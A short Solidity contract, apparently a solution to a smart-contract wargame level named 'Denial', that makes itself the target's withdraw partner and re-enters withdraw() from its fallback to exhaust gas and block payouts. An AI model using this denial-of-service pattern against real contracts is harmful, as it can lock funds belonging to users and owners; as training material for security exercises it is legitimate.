pragma solidity ^0.6.0;

interface IDenial{
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract DenialAttack {
    IDenial idenial;

    constructor(address denialAddress) public {
        idenial = IDenial(denialAddress);
        idenial.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        idenial.withdraw();
    }
}